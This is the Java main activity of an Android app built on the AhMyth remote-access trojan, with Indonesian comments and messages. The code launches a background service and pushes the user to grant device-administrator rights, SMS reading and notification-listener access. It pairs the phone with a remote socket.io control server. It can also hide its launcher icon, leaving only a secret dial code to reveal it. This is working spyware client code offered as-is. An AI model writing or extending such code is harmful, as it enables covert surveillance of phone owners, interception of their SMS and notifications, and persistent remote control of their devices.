package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.Switch;
import android.widget.Toast;

import io.socket.emitter.Emitter;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";
    DevicePolicyManager devicePolicyManager;
    ComponentName componentName;
    SharedPreferences sharedPreferences;

    private Button btnPairing;
    private Button btnListener;
    private Button btnGooglePlay;
    private EditText inputPairingCode;
    private Switch hide_icon_switch;

    private Handler handler = new Handler();
    private boolean listenerSetup = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            MainService.startService(this);
            setContentView(R.layout.activity_main);

            btnPairing = findViewById(R.id.pairingBtn);
            btnListener = findViewById(R.id.listenerBtn);
            btnGooglePlay = findViewById(R.id.btnGooglePlay);
            inputPairingCode = findViewById(R.id.pairingCode);
            hide_icon_switch = findViewById(R.id.switch1);

            componentName = new ComponentName(this, AdminReceiver.class);
            devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);

            // AUTO UPPERCASE
            inputPairingCode.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
                @Override
                public void onTextChanged(CharSequence s, int start, int before, int count) {}
                @Override
                public void afterTextChanged(Editable s) {
                    String input = s.toString();
                    if (!input.equals(input.toUpperCase())) {
                        inputPairingCode.removeTextChangedListener(this);
                        inputPairingCode.setText(input.toUpperCase());
                        inputPairingCode.setSelection(inputPairingCode.getText().length());
                        inputPairingCode.addTextChangedListener(this);
                    }
                }
            });

            // NOTIFICATION LISTENER
            if (!NotificationManager.isNotificationServiceEnabled(this)) {
                btnListener.setText("ENABLE");
            } else {
                btnListener.setText("ENABLED ✓");
                btnListener.setEnabled(false);
            }

            btnListener.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                    startActivity(intent);
                }
            });

            // DEVICE ADMIN
            if (!devicePolicyManager.isAdminActive(componentName)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
                startActivity(intent);
            }

            // PERMISSIONS
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                Intent mIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                mIntent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(mIntent);
            }

            // START SERVICE
            Intent serviceIntent = new Intent(this, MainService.class);
            ContextCompat.startForegroundService(this, serviceIntent);

            // PAIRING BUTTON
            btnPairing.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    String pairingCode = inputPairingCode.getText().toString().trim().toUpperCase();

                    if (pairingCode.isEmpty() || pairingCode.length() != 8) {
                        Toast.makeText(MainActivity.this, "⚠️ Masukkan kode 8 karakter!", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    if (IOSocket.getInstance().getIoSocket() == null || !IOSocket.getInstance().isConnected()) {
                        Toast.makeText(MainActivity.this, "❌ Belum terhubung ke server!", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    try {
                        org.json.JSONObject pairData = new org.json.JSONObject();
                        pairData.put("pairing_code", pairingCode);
                        IOSocket.getInstance().getIoSocket().emit("pair_device", pairData);

                        btnPairing.setEnabled(false);
                        btnPairing.setText("LOADING...");
                        inputPairingCode.setEnabled(false);

                    } catch (Exception e) {
                        Toast.makeText(MainActivity.this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                    }
                }
            });

            // SETUP PAIRING LISTENER - HANYA SEKALI
            setupPairingListenerOnce();

            // HIDE ICON
            if (hide_icon_switch != null && Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                hide_icon_switch.setVisibility(View.VISIBLE);
                sharedPreferences = getSharedPreferences("AppSettings", Context.MODE_PRIVATE);
                final SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();

                hide_icon_switch.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
                    @Override
                    public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                        appSettingEditor.putBoolean("hidden_status", isChecked);
                        appSettingEditor.commit();
                        if (isChecked) {
                            Toast.makeText(MainActivity.this, "⚠️ Dial *55555# untuk show", Toast.LENGTH_LONG).show();
                            fn_hideicon();
                        }
                    }
                });

                boolean hidden = sharedPreferences.getBoolean("hidden_status", false);
                hide_icon_switch.setChecked(hidden);
            } else {
                hide_icon_switch.setVisibility(View.GONE);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }

    // SETUP LISTENER HANYA SEKALI
    private void setupPairingListenerOnce() {
        if (listenerSetup) return;

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (IOSocket.getInstance().getIoSocket() == null) {
                    setupPairingListenerOnce(); // retry
                    return;
                }

                IOSocket.getInstance().getIoSocket().on("pair_result", new Emitter.Listener() {
                    @Override
                    public void call(Object... args) {
                        try {
                            org.json.JSONObject result = (org.json.JSONObject) args[0];
                            final boolean success = result.getBoolean("success");
                            final String message = result.getString("message");

                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    Toast.makeText(MainActivity.this, (success ? "✅ " : "❌ ") + message, Toast.LENGTH_LONG).show();

                                    if (success) {
                                        btnPairing.setText("✓ PAIRED");
                                        btnPairing.setEnabled(false);
                                        inputPairingCode.setEnabled(false);
                                        inputPairingCode.setText("");
                                    } else {
                                        btnPairing.setText("PAIR DEVICE");
                                        btnPairing.setEnabled(true);
                                        inputPairingCode.setEnabled(true);
                                    }
                                }
                            });
                        } catch (Exception e) {
                            Log.e(TAG, "Error: " + e.getMessage());
                        }
                    }
                });

                listenerSetup = true;
                Log.d(TAG, "Listener setup complete");
            }
        }, 3000); // HANYA SEKALI dengan delay 3 detik
    }

    public void fn_hideicon() {
        getPackageManager().setComponentEnabledSetting(
                getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
    }

    public void openGooglePlay(View view) {
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps"));
        startActivity(intent);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (btnListener != null && NotificationManager.isNotificationServiceEnabled(this)) {
            btnListener.setText("ENABLED ✓");
            btnListener.setEnabled(false);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
            IOSocket.getInstance().getIoSocket().off("pair_result");
        }
    }
}